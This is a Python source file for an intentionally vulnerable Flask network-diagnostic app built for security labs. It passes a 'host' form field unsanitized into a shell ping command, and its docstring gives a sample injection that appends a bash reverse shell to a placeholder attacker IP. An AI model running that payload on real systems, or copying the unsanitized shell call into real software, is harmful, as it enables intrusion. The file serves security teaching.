"""
vulnapp - Intentionally Vulnerable Flask Application

A minimal network diagnostic web application that simulates
a common administrative tool. It exposes a '/ping' form that
accepts a hostname or IP address and executes a system ping.

VULNERABILITY (deliberate):
  The user-supplied 'host' input is passed directly to subprocess.run()
  with shell=True, without any sanitization. This is a textbook
  Command Injection (OWASP Top 10 A03:2021 - Injection).

  A malicious input such as:
      127.0.0.1; bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
  results in the shell executing both the ping command and the
  appended bash reverse shell.

WARNING: This application is intentionally insecure.
         DO NOT deploy in any production or public environment.
         For educational/lab use only.
"""

import subprocess
from flask import Flask, render_template, request

app = Flask(__name__)


@app.route("/", methods=["GET", "POST"])
def index():
    output = None
    if request.method == "POST":
        host = request.form.get("host", "")
        # VULNERABILITY: unsanitized user input passed to the shell
        result = subprocess.run(
            f"ping -c 2 {host}",
            shell=True,
            capture_output=True,
            text=True,
            timeout=10,
        )
        output = result.stdout + result.stderr
    return render_template("index.html", output=output)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
